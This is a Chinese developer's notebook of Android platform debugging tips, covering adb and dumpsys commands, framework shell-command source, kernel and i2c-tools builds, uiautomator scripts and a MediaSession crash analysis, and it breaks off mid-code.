EFI可扩展固件接口(英文名Extensible Firmware Interface 或EFI)是由英特尔，一个主导个人电脑技术研发的公司推出的一种在未来的类PC的电脑系统中替代BIOS的升级方案。BIOS技术的兴起源于IBM PC/AT机器的流行以及第一台由康柏公司研制生产的“克隆”PC。在PC启动的过程中，BIOS担负着初始化硬件，检测硬件功能，以及引导操作系统的责任，在早期，BIOS还提供一套运行时的服务程序给操作系统及应用程序使用。BIOS程序存放于一个掉电后内容不会丢失的只读存储器中，系统加电时处理器的第一条指令的地址会被定位到BIOS的存储器中，便于使初始化程序得到执行。
```

## PCIE

## SCSI

## [CMD] adb shell dumpsys battery set level解析

```text
frameworks/base/services/core/java/com/android/server/BatteryService.java
private final class BinderService extends Binder {
    @Override protected void dump(FileDescriptor fd, PrintWriter pw, String[]  args) {
        if (!DumpUtils.checkDumpPermission(mContext, TAG, pw)) return;

        if (args.length > 0 && "--proto".equals(args[0] )) {
            dumpProto(fd);
        } else {
            dumpInternal(fd, pw, args);
        }
    }

    @Override public void onShellCommand(FileDescriptor in, FileDescriptor out,
            FileDescriptor err, String[]  args, ShellCallback callback,
            ResultReceiver resultReceiver) {
        (new Shell()).exec(this, in, out, err, args, callback, resultReceiver);
    }
}

private void dumpInternal(FileDescriptor fd, PrintWriter pw, String[]  args) {
    synchronized (mLock) {
        if (args == null || args.length == 0 || "-a".equals(args[0] )) {
            pw.println("Current Battery Service state:");
            if (mUpdatesStopped) {
                pw.println("  (UPDATES STOPPED -- use 'reset' to restart)");
            }
            pw.println("  AC powered: " + mHealthInfo.chargerAcOnline);
            pw.println("  USB powered: " + mHealthInfo.chargerUsbOnline);
            pw.println("  Wireless powered: " + mHealthInfo.chargerWirelessOnline);
            pw.println("  Max charging current: " + mHealthInfo.maxChargingCurrent);
            pw.println("  Max charging voltage: " + mHealthInfo.maxChargingVoltage);
            pw.println("  Charge counter: " + mHealthInfo.batteryChargeCounter);
            pw.println("  status: " + mHealthInfo.batteryStatus);
            pw.println("  health: " + mHealthInfo.batteryHealth);
            pw.println("  present: " + mHealthInfo.batteryPresent);
            pw.println("  level: " + mHealthInfo.batteryLevel);
            pw.println("  scale: " + BATTERY_SCALE);
            pw.println("  voltage: " + mHealthInfo.batteryVoltage);
            pw.println("  temperature: " + mHealthInfo.batteryTemperature);
            pw.println("  technology: " + mHealthInfo.batteryTechnology);
        } else {
            Shell shell = new Shell();
            shell.exec(mBinderService, null, fd, null, args, null, new ResultReceiver(null));
        }
    }
}

class Shell extends ShellCommand {
    @Override
    public int onCommand(String cmd) {
        return onShellCommand(this, cmd);
    }

    @Override
    public void onHelp() {
        PrintWriter pw = getOutPrintWriter();
        dumpHelp(pw);
    }
}

int onShellCommand(Shell shell, String cmd) {
    if (cmd == null) {
        return shell.handleDefaultCommands(cmd);
    }
    PrintWriter pw = shell.getOutPrintWriter();
    switch (cmd) {
        case "unplug": {
            int opts = parseOptions(shell);
            getContext().enforceCallingOrSelfPermission(
                    android.Manifest.permission.DEVICE_POWER, null);
            if (!mUpdatesStopped) {
                copy(mLastHealthInfo, mHealthInfo);
            }
            mHealthInfo.chargerAcOnline = false;
            mHealthInfo.chargerUsbOnline = false;
            mHealthInfo.chargerWirelessOnline = false;
            long ident = Binder.clearCallingIdentity();
            try {
                mUpdatesStopped = true;
                processValuesFromShellLocked(pw, opts);
            } finally {
                Binder.restoreCallingIdentity(ident);
            }
        } break;
        case "set": {
            int opts = parseOptions(shell);
            getContext().enforceCallingOrSelfPermission(
                    android.Manifest.permission.DEVICE_POWER, null);
            final String key = shell.getNextArg();
            if (key == null) {
                pw.println("No property specified");
                return -1;

            }
            final String value = shell.getNextArg();
            if (value == null) {
                pw.println("No value specified");
                return -1;

            }
            try {
                if (!mUpdatesStopped) {
                    copy(mLastHealthInfo, mHealthInfo);
                }
                boolean update = true;
                switch (key) {
                    case "present":
                        mHealthInfo.batteryPresent = Integer.parseInt(value) != 0;
                        break;
                    case "ac":
                        mHealthInfo.chargerAcOnline = Integer.parseInt(value) != 0;
                        break;
                    case "usb":
                        mHealthInfo.chargerUsbOnline = Integer.parseInt(value) != 0;
                        break;
                    case "wireless":
                        mHealthInfo.chargerWirelessOnline = Integer.parseInt(value) != 0;
                        break;
                    case "status":
                        mHealthInfo.batteryStatus = Integer.parseInt(value);
                        break;
                    case "level":
                        mHealthInfo.batteryLevel = Integer.parseInt(value);
                        break;
                    case "counter":
                        mHealthInfo.batteryChargeCounter = Integer.parseInt(value);
                        break;
                    case "temp":
                        mHealthInfo.batteryTemperature = Integer.parseInt(value);
                        break;
                    case "invalid":
                        mInvalidCharger = Integer.parseInt(value);
                        break;
                    default:
                        pw.println("Unknown set option: " + key);
                        update = false;
                        break;
                }
                if (update) {
                    long ident = Binder.clearCallingIdentity();
                    try {
                        mUpdatesStopped = true;
                        processValuesFromShellLocked(pw, opts);
                    } finally {
                        Binder.restoreCallingIdentity(ident);
                    }
                }
            } catch (NumberFormatException ex) {
                pw.println("Bad value: " + value);
                return -1;
            }
        } break;
        case "reset": {
            int opts = parseOptions(shell);
            getContext().enforceCallingOrSelfPermission(
                    android.Manifest.permission.DEVICE_POWER, null);
            long ident = Binder.clearCallingIdentity();
            try {
                if (mUpdatesStopped) {
                    mUpdatesStopped = false;
                    copy(mHealthInfo, mLastHealthInfo);
                    processValuesFromShellLocked(pw, opts);
                }
            } finally {
                Binder.restoreCallingIdentity(ident);
            }
        } break;
        default:
            return shell.handleDefaultCommands(cmd);
    }
    return 0;
}
```

## 查看recents缩略图

```text
adb pull /data/system_ce/0/snapshots ./snaps
```

## 编译Kernel

```text
进入
export ARCH=arm
make menuconfig
make O=output sprd_pike2_defconfig --debug

这个 sprd_pike2_defconfig 文件在 alps/bsp/kernel/kernel4.14/arch/arm/configs/ 下, 里面可能有很多手机代号, 你可以查看你的手机的内核信息, 或者 手机的 system/build.prop里有你的代号
```

## uiautomator2

```text
import uiautomator2 as d
import time
def douyin():
    # 通过usb连接
    a=d.connect_usb('3d51a18c')
    # 打开抖音
    a(text="抖音极速版").click()
    while True:
        time.sleep(10)
     # 滑动视频
        a.swipe(313,1370,313,110)

if __name__=='__main__':
    douyin()


pip install --pre -U uiautomator2
给设备安装atx-agent
python -m uiautomator2 init
```

## 通过 uiautomator 获取界面

```text
大家在做android自动化测试时，必定会需要知道界面元素/控件的相关属性，如id，class等，这时在androidsdk的tool工具中就会用到uiautomatorviewer 和 hierarchyviewer。这两个工具都可以很直观的方便大家去查找界面元素，而这样只是单纯的人工借助工具去查看，既然是要做自动化测试，必然我们要去通过代码编程去代替手工操作了。在pyapp框架中，我也是利用uiautomatorviewer来捕获app界面的从而获取对应的元素/控件。接下来我们就来看看python是如何做到的。相对来说uiautomatorviewer的实现更容易些，一条adb命令就可以了。

order='adb -s device shell uiautomator dump'

运行成功后会返回：

“UI hierchary dumped to: /storage/emulated/legacy/window_dump.xml“

结果很直观了，这个window_dump.xml里就是整个界面的布局层级信息，从中我们就可以获取到各个元素/控件的属性信息。如果利用浏览器打开xml文件大家也可以直观的看到界面的层级关系，如果大家只关心具体的元素控件，我们可以在命令后面加上—compressed，这样获取的xml就会清爽许多。

我们接着看看怎么在python中利用hierarchyviewer实现元素/控件获取，首先我们要知道要实现hierarchyviewer的元素获取我们要打开手机的View Server服务，并与其进行socket通信，从而获取到元素/控件信息。那么接下来我们将通过几条不同的adb命令来准备好与View Server进行通信的环境。

第一步：

通过“adb shell service call window 3”命令得到返回值Result: Parcel(00000000 00000001   '........')或者Result: Parcel(00000000 00000000   '........')如果是00000001表示View Server是开启的，反之我们就要开启View Server服务。

第二步：

如果View Server没有打开，我们就通过“adb shell service call window 1 i32 4939”命令打开。然后再通过第一步的命令确认是否开启了View Server。

第三步：

当我们开启了服务后，需要再将手机的4939端口映射到电脑的4939端口，这样就可以进行socket通信了。命令为“adb forward tcp:4939 tcp:4939”

以上这三步完成后，接下来我们就可以在python脚本中与View Server建立socket通信了。由于已经有服务端View Server，我们只需要用python实现客户端的socket代码即可。

import socket#导入socket模块

sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)#建立TCP连接

sock.connect(('127.0.0.1',4939))#连接服务端地址及端口并建立连接

sock.send('list')#发送list命令向服务端

sock.recv(1024)#接收返回结果

这里就不去讲解python的socket用法了，重点讲解一下这里的list指令。当我们建立好与View Server的通信后，就可以发送不同的指令向服务端，获取信息了，这里的list意思就是获取当前手机活动界面的信息。如下图

有了这个信息，我们就可以继续发送dump命令去获取具体某个界面的详细层级信息了。举个例子比如我们要打印出上图中第二行

“432b8608 com.miui.home/com.miui.home.launcher.Launcher”

的界面信息，在我们发送内容中应该这样写sock.send(“dump 432b8608”),获取结果如下图。由于内容会比较多，建议大家在代码中将返回值写入txt文件中，方便查看。具体的内容中每一段表示一个元素，里边详细的列举了元素的各种属性信息，如id，class，坐标等。

至此，我们了解到通过发送list，dump两个命令可以进行元素信息的获取。另外还有一个capture命令可以获取到元素在界面中的截图，这里就不再赘述了。至于到底是用uiautomatorviewer 还是 hierarchyviewer去实现元素的获取，决定权就在你的手上了。
```

## 自动生成的序列Log

```text
何为自动生成的序列log，一般系统启动过程中，
就默认开启了某种类型的log，且序列化存储，新的会自动冲刷掉旧的log。

比如logcat序列log，
一般是全部写到logcat.txt，写满5M后，
将logcat.txt重命名为logcat.txt.1，以此类推。。。
所以logcat.txt就始终是最新的log，
然后就是logcat.txt.1，
再然后是logcat.txt.2，
…
最后是到序列logcat.txt.20

当然以上取决于init.rc里的关于logcat自启动命令的设置，
比如init.rc配置文件，如果设置如下：
/system/bin/logcat -b system -b events -b main -b radio -n 20 -r5000 -v threadtime -f /data/logs/logcat.txt

以上启动命令则表示：截取所有包括system，events,main,radio四种缓冲区的logcat 日志，
并设置自动序列为20个序列片段，-r5000 代表是5M一个，
-v threadtime是打印线程级别的时间戳,
-f 是输出到什么路径，logcat.txt是初始和默认的句柄文件。

其他的dbus.txt序列log， kernel序列log也是一致的。
```

## [CMD] 打印进程调用栈

```text
adb shell debuggerd -b [PID] 
```

## [CMD] 用aidl命令把aidl文件转换成cpp

```text
aidl.exe --lang=cpp -IF:\binder_drivers_code\ServiceDemo\app\src\main\aidl\com\example\servicedemo  F:\binder_drivers_code\ServiceDemo\app\src\main\aidl\com\example\servicedemo\IStudentInterface1.aidl -o f:\ --header_out f:\
```

## [CMD] adb shell pm path 的实现源码

```text
执行 adb shell pm path 的时候最终会执行到 adb shell cmd package path

调用 cmd 命令的时候会执行到 PackageManagerService.onShellCommand() 方法

@Override
public void onShellCommand(FileDescriptor in, FileDescriptor out,
        FileDescriptor err, String[]  args, ShellCallback callback,
        ResultReceiver resultReceiver) {
    (new PackageManagerShellCommand(this, mPermissionManagerService)).exec(
            this, in, out, err, args, callback, resultReceiver);
}

frameworks/base/services/core/java/com/android/server/pm/PackageManagerShellCommand.java

class PackageManagerShellCommand extends ShellCommand {
    @Override
    public int onCommand(String cmd) {
        if (cmd == null) {
            return handleDefaultCommands(cmd);
        }
        final PrintWriter pw = getOutPrintWriter();
        try {
            switch (cmd) {
                case "path":                                            // pm 支持的命令
                    return runPath();
                case "validate":
                    return runValidate();
                case "dump":
                    return runDump();
                case "list":
                    return runList();
                case "resolve-activity":
                    return runResolveActivity();
                case "query-activities":
                    return runQueryIntentActivities();
                case "query-services":
                    return runQueryIntentServices();
                case "query-receivers":
                    return runQueryIntentReceivers();
                case "install":
                    return runInstall();
                case "install-streaming":
                    return runStreamingInstall();
                case "install-incremental":
                    return runIncrementalInstall();
                case "install-abandon":
                case "install-destroy":
                    return runInstallAbandon();
                case "install-commit":
                    return runInstallCommit();
                case "install-create":
                    return runInstallCreate();
                case "install-remove":
                    return runInstallRemove();
                case "install-write":
                    return runInstallWrite();
                case "install-existing":
                    return runInstallExisting();
                case "set-install-location":
                    return runSetInstallLocation();
                case "get-install-location":
                    return runGetInstallLocation();
                case "install-add-session":
                    return runInstallAddSession();
                case "move-package":
                    return runMovePackage();
                case "move-primary-storage":
                    return runMovePrimaryStorage();
                case "compile":
                    return runCompile();
                case "reconcile-secondary-dex-files":
                    return runreconcileSecondaryDexFiles();
                case "force-dex-opt":
                    return runForceDexOpt();
                case "bg-dexopt-job":
                    return runDexoptJob();
                case "dump-profiles":
                    return runDumpProfiles();
                case "snapshot-profile":
                    return runSnapshotProfile();
                case "uninstall":
                    return runUninstall();
                case "clear":
                    return runClear();
                case "enable":
                    return runSetEnabledSetting(PackageManager.COMPONENT_ENABLED_STATE_ENABLED);
                case "disable":
                    return runSetEnabledSetting(PackageManager.COMPONENT_ENABLED_STATE_DISABLED);
                case "disable-user":
                    return runSetEnabledSetting(
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_USER);
                case "disable-until-used":
                    return runSetEnabledSetting(
                            PackageManager.COMPONENT_ENABLED_STATE_DISABLED_UNTIL_USED);
                case "default-state":
                    return runSetEnabledSetting(PackageManager.COMPONENT_ENABLED_STATE_DEFAULT);
                case "hide":
                    return runSetHiddenSetting(true);
                case "unhide":
                    return runSetHiddenSetting(false);
                case "suspend":
                    return runSuspend(true);
                case "unsuspend":
                    return runSuspend(false);
                case "grant":
                    return runGrantRevokePermission(true);
                case "revoke":
                    return runGrantRevokePermission(false);
                case "reset-permissions":
                    return runResetPermissions();
                case "set-permission-enforced":
                    return runSetPermissionEnforced();
                case "get-privapp-permissions":
                    return runGetPrivappPermissions();
                case "get-privapp-deny-permissions":
                    return runGetPrivappDenyPermissions();
                case "get-oem-permissions":
                    return runGetOemPermissions();
                case "set-app-link":
                    return runSetAppLink();
                case "get-app-link":
                    return runGetAppLink();
                case "trim-caches":
                    return runTrimCaches();
                case "create-user":
                    return runCreateUser();
                case "remove-user":
                    return runRemoveUser();
                case "set-user-restriction":
                    return runSetUserRestriction();
                case "get-max-users":
                    return runGetMaxUsers();
                case "get-max-running-users":
                    return runGetMaxRunningUsers();
                case "set-home-activity":
                    return runSetHomeActivity();
                case "set-installer":
                    return runSetInstaller();
                case "get-instantapp-resolver":
                    return runGetInstantAppResolver();
                case "has-feature":
                    return runHasFeature();
                case "set-harmful-app-warning":
                    return runSetHarmfulAppWarning();
                case "get-harmful-app-warning":
                    return runGetHarmfulAppWarning();
                case "get-stagedsessions":
                    return runListStagedSessions();
                case "uninstall-system-updates":
                    String packageName = getNextArg();
                    return uninstallSystemUpdates(packageName);
                case "rollback-app":
                    return runRollbackApp();
                case "get-moduleinfo":
                    return runGetModuleInfo();
                case "log-visibility":
                    return runLogVisibility();
                case "bypass-staged-installer-check":
                    return runBypassStagedInstallerCheck();
                default: {
                    String nextArg = getNextArg();
                    if (nextArg == null) {
                        if (cmd.equalsIgnoreCase("-l")) {
                            return runListPackages(false);
                        } else if (cmd.equalsIgnoreCase("-lf")) {
                            return runListPackages(true);
                        }
                    } else if (getNextArg() == null) {
                        if (cmd.equalsIgnoreCase("-p")) {
                            return displayPackageFilePath(nextArg, UserHandle.USER_SYSTEM);
                        }
                    }
                    return handleDefaultCommands(cmd);
                }
            }
        } catch (RemoteException e) {
            pw.println("Remote exception: " + e);
        }
        return -1;
    }

public abstract class ShellCommand extends BasicShellCommandHandler {
    private ShellCallback mShellCallback;
    private ResultReceiver mResultReceiver;

    public int exec(Binder target, FileDescriptor in, FileDescriptor out, FileDescriptor err,
            String[]  args, ShellCallback callback, ResultReceiver resultReceiver) {
        mShellCallback = callback;
        mResultReceiver = resultReceiver;
        final int result = super.exec(target, in, out, err, args);

        if (mResultReceiver != null) {
            mResultReceiver.send(result, null);
        }

        return result;
    }
    public int handleDefaultCommands(String cmd) {
        if ("dump".equals(cmd)) {
            String[]  newArgs = new String[getAllArgs().length-1] ;
            System.arraycopy(getAllArgs(), 1, newArgs, 0, getAllArgs().length-1);
            getTarget().doDump(getOutFileDescriptor(), getOutPrintWriter(), newArgs);
            return 0;
        }
        return super.handleDefaultCommands(cmd);
    }
```

## Android studio 导入源码

```text
make idegen && development/tools/idegen/idegen.sh
然后studio 打开文件 android.ipr

参考链接：http://www.jianshu.com/p/fb16fa459acf
```

## [CMD] 设置USB连接模式

```text
adb shell svc usb setFunctions mtp

frameworks/base/cmds/svc/src/com/android/commands/svc/UsbCommand.java
```

## i2c-tools使用

```text
在android使用i2c tools访问i2c,很方便,可以在https://launchpad.net/ubuntu/+source/i2c-tools 下载最新的i2c tools.

把i2c-tools-3.1.1 解压到external下,然后在i2c-tools-3.1.1根目录下创建Android.mk文件,内容为:

LOCAL_PATH:= $(call my-dir)
 
include $(CLEAR_VARS)
 
LOCAL_MODULE_TAGS := optional
LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH) $(LOCAL_PATH)/$(KERNEL_DIR)/include
LOCAL_SRC_FILES := tools/i2cbusses.c tools/util.c
LOCAL_MODULE := i2c-tools
include $(BUILD_STATIC_LIBRARY)
 
include $(CLEAR_VARS)
 
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES:=tools/i2cdetect.c
LOCAL_MODULE:=i2cdetect
LOCAL_CPPFLAGS += -DANDROID
LOCAL_SHARED_LIBRARIES:=libc
LOCAL_STATIC_LIBRARIES := i2c-tools
LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH) $(LOCAL_PATH)/$(KERNEL_DIR)/include
include $(BUILD_EXECUTABLE)
 
include $(CLEAR_VARS)
 
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES:=tools/i2cget.c
LOCAL_MODULE:=i2cget
LOCAL_CPPFLAGS += -DANDROID
LOCAL_SHARED_LIBRARIES:=libc
LOCAL_STATIC_LIBRARIES := i2c-tools
LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH) $(LOCAL_PATH)/$(KERNEL_DIR)/include
include $(BUILD_EXECUTABLE)
 
include $(CLEAR_VARS)
 
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES:=tools/i2cset.c
LOCAL_MODULE:=i2cset
LOCAL_CPPFLAGS += -DANDROID
LOCAL_SHARED_LIBRARIES:=libc
LOCAL_STATIC_LIBRARIES := i2c-tools
LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH) $(LOCAL_PATH)/$(KERNEL_DIR)/include
include $(BUILD_EXECUTABLE)
 
include $(CLEAR_VARS)
 
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES:=tools/i2cdump.c
LOCAL_MODULE:=i2cdump
LOCAL_CPPFLAGS += -DANDROID
LOCAL_SHARED_LIBRARIES:=libc
LOCAL_STATIC_LIBRARIES := i2c-tools
LOCAL_C_INCLUDES += $(LOCAL_PATH)/include $(LOCAL_PATH) $(LOCAL_PATH)/$(KERNEL_DIR)/include
include $(BUILD_EXECUTABLE)


然后在该目录下执行mm,即可编译成功.,生成生成i2cdetect,i2cdump,i2cset,i2cget等命令工具.


-----------------------下面是关于这四个命令的用法举例

i2c-tools中含有四個執行檔

i2cdetect – 用來列舉I2C bus和上面所有的裝置
i2cdump – 顯示裝置上所有register的值
i2cget – 讀取裝置上某個register的值
i2cset – 寫入裝置上某個register
以下是实验結果

/system/bin # i2cdetect -l
i2c-0   i2c             s3c2410-i2c                             I2C adapter
i2c-1   i2c             s3c2410-i2c                             I2C adapter
i2c-2   i2c             s3c2410-i2c                             I2C adapter
/system/bin #
看到有三条I2C总线

/system/bin # i2cdetect -y -r 0
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f
00:          -- -- -- -- -- -- -- -- -- -- -- -- --
10: -- -- -- -- -- -- -- -- -- -- UU -- -- -- -- --
20: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
30: -- -- -- -- 34 -- -- -- -- -- -- -- -- -- -- --
40: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
50: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
60: -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --
70: -- -- -- -- -- -- -- --
发现 I2C 设备的位置显示为UU或者表示设备地址的数值，UU表示该设备在 driver 中被使用。

/system/bin #

查看总线0上面有哪些设备以及设备地址；


/system/bin # i2cdump -f -y 0 0x34
No size specified (using byte-data access)
     0  1  2  3  4  5  6  7  8  9  a  b  c  d  e  f    0123456789abcdef
00: 38 70 00 21 00 00 00 00 00 00 00 00 00 00 00 00    8p.!............
10: 05 00 5f 00 00 00 00 00 00 00 00 00 00 00 00 00    ?._.............
20: 00 00 00 16 00 00 00 68 ff 68 00 00 00 00 00 00    ...?...h.h......
30: 61 02 42 c9 45 22 9d 08 a5 1f 68 5f fc 16 00 00    a?B?E"????h_??..
40: d8 ff 03 01 00 00 00 00 08 08 02 00 60 00 00 00    ?.??....???.`...
50: cf 0e 00 00 0e 1f 00 00 00 00 00 00 00 00 71 04    ??..??........q?
60: a2 05 00 08 00 00 00 00 00 00 00 00 00 00 00 00    ??.?............
70: 0c 27 a1 00 00 00 00 00 d0 02 00 00 0f 17 a2 00    ?'?.....??..???.
80: e0 fd 83 80 32 00 ff 00 00 00 00 00 00 00 00 21    ????2..........!
90: 07 a5 07 07 00 02 00 00 00 00 00 00 00 00 00 00    ????.?..........
a0: 00 00 00 00 00 01 1d 01 cd 06 00 00 0e 12 a2 0b    .....?????..????
b0: 00 00 00 00 00 00 00 00 00 14 80 ba d2 0d 00 00    .........?????..
c0: 01 01 02 04 07 0d 10 1a 24 2e 35 3d 49 54 5c 63    ????????$.5=IT\c
d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
f0: 41 00 80 03 00 00 00 00 00 00 00 00 00 00 00 00    A.??............



/system/bin # i2cget -f -y 0 0x34 0x28
0xff
/system/bin #
单独读0x28寄存器的值
/system/bin #
/system/bin #
/system/bin # i2cset -f -y 0 0x34 0x28 0xfb
/system/bin #
单独写0x28寄存器的值
/system/bin # i2cget -f -y 0 0x34 0x28
0xfb
/system/bin #
可以看出寄存器值已经由0xff改成为0xfb
```

## [CMD] 获取sensor信息

```text
adb shell dumpsys sensorservice
```

## Android 关键 log

```text
1.windowmanager接收到全局按键
WindowManager: interceptKeyTq keycode=26 interactive=false keyguardActive=true policyFlags=2000000
WindowManager: interceptKeyTq keycode=26 interactive=false keyguardActive=true policyFlags=2000000 down =true   // 按下
WindowManager: interceptKeyTq keycode=26 interactive=true keyguardActive=false policyFlags=22000000
WindowManager: interceptKeyTq keycode=26 interactive=true keyguardActive=false policyFlags=22000000 down =false // 松开

2.powermanager接收到power键灭屏
PowerManagerService: Going to sleep due to power button

3.亮灭屏
DisplayManagerService: Display device changed state: "内置屏幕", OFF
DisplayManagerService: Display device changed state: "内置屏幕", ON

4.背光设置
10-10 14:21:54.302  1259  1873 D LocalDisplayAdapter: setDisplayBrightness(id=0, brightness=28)
10-10 14:21:54.302  1259  1873 V LightsService: setLight #0: color=#ff1c1c1c: brightnessMode=0
```

## build/envsetup.sh

```text
smoketest 方法修改
function smoketest()
{
    if [ ! "$ANDROID_PRODUCT_OUT" ] ; then
        echo "Couldn't locate output files.  Try running 'lunch' first." >&2
        return
    fi
    local T=$(gettop)
    if [ ! "$T" ] ; then
        echo "Couldn't locate the top of the tree.  Try setting TOP." >&2
        return
    fi

    (\cd "$T" && mmm frameworks/base/tests/SmokeTest) &&
      adb uninstall com.android.smoketest > /dev/null &&
      adb uninstall com.android.smoketest.tests > /dev/null &&
      adb install -r $ANDROID_PRODUCT_OUT/testcases/SmokeTest/arm/SmokeTest.apk &&
      adb install -r $ANDROID_PRODUCT_OUT/testcases/SmokeTestApp/arm/SmokeTestApp.apk &&
      adb shell am instrument -w com.android.smoketest.tests/com.android.smoketest.SmokeTestRunner
}
```

## [100591] 设置下开启关闭蓝牙报错分析

```text
09-28 13:06:08.697706 30214 30214 E AndroidRuntime: FATAL EXCEPTION: main
09-28 13:06:08.697706 30214 30214 E AndroidRuntime: Process: com.android.music, PID: 30214
09-28 13:06:08.697706 30214 30214 E AndroidRuntime: java.lang.RuntimeException: Unable to create service com.android.music.MediaPlaybackService: java.lang.NullPointerException: Attempt to invoke interface method 'android.media.session.ISessionController android.media.session.ISession.getController()' on a null object reference
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.app.ActivityThread.handleCreateService(ActivityThread.java:4264)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.app.ActivityThread.access$1700(ActivityThread.java:244)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1995)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.os.Handler.dispatchMessage(Handler.java:106)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.os.Looper.loop(Looper.java:223)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.app.ActivityThread.main(ActivityThread.java:7740)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at java.lang.reflect.Method.invoke(Native Method)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:612)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:1081)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime: Caused by: java.lang.NullPointerException: Attempt to invoke interface method 'android.media.session.ISessionController android.media.session.ISession.getController()' on a null object reference
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.media.session.MediaSession.<init>(MediaSession.java:199)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.media.session.MediaSession.<init>(MediaSession.java:156)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at com.android.music.MediaPlaybackService.onCreate(MediaPlaybackService.java:45)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  at android.app.ActivityThread.handleCreateService(ActivityThread.java:4252)
09-28 13:06:08.697706 30214 30214 E AndroidRuntime:  ... 8 more
从报错的log中和截图中看应该是打开蓝牙的时候会触发打开 Android Open Source Music Playback Service，从而导致的报错
<service android:name="com.android.music.MediaPlaybackService"
         android:exported="true"
         android:label="Android Open Source Music Playback Service">
    <intent-filter>
        <action android:name="android.media.browse.MediaBrowserService" />
    </intent-filter>
</service>

MediaPlaybackService.java
mSession = new MediaSession(this, "MediaPlaybackService");

MediaSession.java
try {
    mBinder = manager.createSession(mCbStub, tag, sessionInfo);             
    mSessionToken = new Token(Process.myUid(), mBinder.getController());    // mBinder为空导致的报错，说明上面createSession没有成功
    mController = new MediaController(context, mSessionToken);
} catch (RemoteException e) {
    throw new RuntimeException("Remote error creating session.", e);
}

MediaSessionService.java
@Override
public ISession createSession(String packageName, ISessionCallback cb, String tag,
        Bundle sessionInfo, int userId) throws RemoteException {
    final int pid = Binder.getCallingPid();
    final int uid = Binder.getCallingUid();
    final long token = Binder.clearCallingIdentity();
    try {
        enforcePackageName(packageName, uid);
        int resolvedUserId = ActivityManager.handleIncomingUser(pid, uid, userId,
                false /* allowAll */, true /* requireFull */, "createSession", packageName);
        if (cb == null) {
            throw new IllegalArgumentException("Controller callback cannot be null");
        }
        MediaSessionRecord session = createSessionInternal(
                pid, uid, resolvedUserId, packageName, cb, tag, sessionInfo);
        if (session == null) {
            throw new IllegalStateException("Failed to create a new session record");
        }
        ISession sessionBinder = session.getSessionBinder();
        if (sessionBinder == null) {
            throw new IllegalStateException("Invalid session record");
        }
        return sessionBinder;
    } catch (Exception e) {
        Slog.w(TAG, "Exception in creating a new session", e);              //通过这行log在sys_log中找到了关键信息
        throw e;
    } finally {
        Binder.restoreCallingIdentity(token);
    }
}

mobilelog/APLog_2021_0103_082059__1/sys_log_105__2021_0929_022307
09-28 18:45:47.365026   745  3090 W MediaSessionService: Exception in creating a new session
09-28 18:45:47.365026   745  3090 W MediaSessionService: java.lang.RuntimeException: Created too many sessions. count=100)      //创建了太多的session了，导致报错，和问题中的描述一致
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at com.android.server.media.MediaSessionService.createSessionInternal(MediaSessionService.java:601)
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at com.android.server.media.MediaSessionService.access$2400(MediaSessionService.java:105)
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at com.android.server.media.MediaSessionService$SessionManagerImpl.createSession(MediaSessionService.java:1144)
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at android.media.session.ISessionManager$Stub.onTransact(ISessionManager.java:289)
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at android.os.Binder.execTransactInternal(Binder.java:1154)
09-28 18:45:47.365026   745  3090 W MediaSessionService:  at android.os.Binder.execTransact(Binder.java:1123)
09-28 18:45:47.411609   745   791 D BluetoothManagerService: MESSAGE_BLUETOOTH_STATE_CHANGE: TURNING_ON > ON
09-28 18:45:47.412572   745   791 D BluetoothManagerService: Broadcasting onBluetoothStateChange(true) to 24 receivers.
09-28 18:45:47.419077   745   791 D BluetoothManagerService: Creating new ProfileServiceConnections object for profile: 1

然后找到下面这段代码，目前肯定是满足了第一个条件，private static final int SESSION_CREATION_LIMIT_PER_UID = 100;
if (sessionCount >= SESSION_CREATION_LIMIT_PER_UID
        && !hasMediaControlPermission(callerPid, callerUid)) {
    throw new RuntimeException("Created too many sessions. count="
            + sessionCount + ")");
}

private boolean hasMediaControlPermission(int pid, int uid) {
    // Check if it's system server or has MEDIA_CONTENT_CONTROL.
    // Note that system server doesn't have MEDIA_CONTENT_CONTROL, so we need extra
    // check here.
    if (uid == Process.SYSTEM_UID || mContext.checkPermission(
            android.Manifest.permission.MEDIA_CONTENT_CONTROL, pid, uid)
            == PackageManager.PERMISSION_GRANTED) {
        return true;
    } else if (DEBUG) {
